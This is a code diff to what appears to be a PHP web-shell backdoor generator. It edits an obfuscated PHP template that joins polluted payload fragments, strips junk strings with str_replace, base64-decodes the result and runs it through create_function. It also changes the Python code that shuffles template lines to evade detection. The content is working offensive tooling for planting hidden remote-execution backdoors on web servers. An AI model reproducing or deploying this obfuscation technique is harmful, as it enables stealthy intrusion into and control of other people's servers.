@@ -39,9 +39,8 @@ $%%PAY_VAR1%%="%%PAYLOAD1%%";
 $%%PAY_VAR2%%="%%PAYLOAD2%%";
 $%%PAY_VAR3%%="%%PAYLOAD3%%";
 $%%PAY_VAR4%%="%%PAYLOAD4%%";
-$%%B64_FUNC%% = "%%B64_ENCODED%%";
 $%%REPL_FUNC%% = "str_replace";
-$%%B64_FUNC%% = $%%REPL_FUNC%%("%%B64_POLLUTION%%", "", $%%B64_FUNC%%);
+$%%B64_FUNC%% = $%%REPL_FUNC%%("%%B64_POLLUTION%%", "", "%%B64_ENCODED%%");
 $%%CREATFUNC%% = $%%REPL_FUNC%%("%%CREATFUNC_POLLUTION%%","","%%CREATFUNC_ENCODED%%");
 $%%FINALFUNC%% = $%%CREATFUNC%%('', $%%B64_FUNC%%($%%REPL_FUNC%%("%%PAYLOAD_POLLUTION%%", "", $%%PAY_VAR1%%.$%%PAY_VAR2%%.$%%PAY_VAR3%%.$%%PAY_VAR4%%))); $%%FINALFUNC%%();
 ?>"""
@@ -82,9 +81,9 @@ $%%FINALFUNC%% = $%%CREATFUNC%%('', $%%B64_FUNC%%($%%REPL_FUNC%%("%%PAYLOAD_POLL
 		piece3  = length*3/4 + randrange(-offset,+offset)
 		
 		ts_splitted = self.backdoor_template.splitlines()
-		ts_shuffled = ts_splitted[1:7]
+		ts_shuffled = ts_splitted[1:6]
 		shuffle(ts_shuffled)
-		ts_splitted = [ts_splitted[0]] + ts_shuffled + ts_splitted[7:]
+		ts_splitted = [ts_splitted[0]] + ts_shuffled + ts_splitted[6:]
 		self.backdoor_template = '\n'.join(ts_splitted)
 		
 		template = self.backdoor_template.replace( '%%B64_ENCODED%%', b64_polluted )
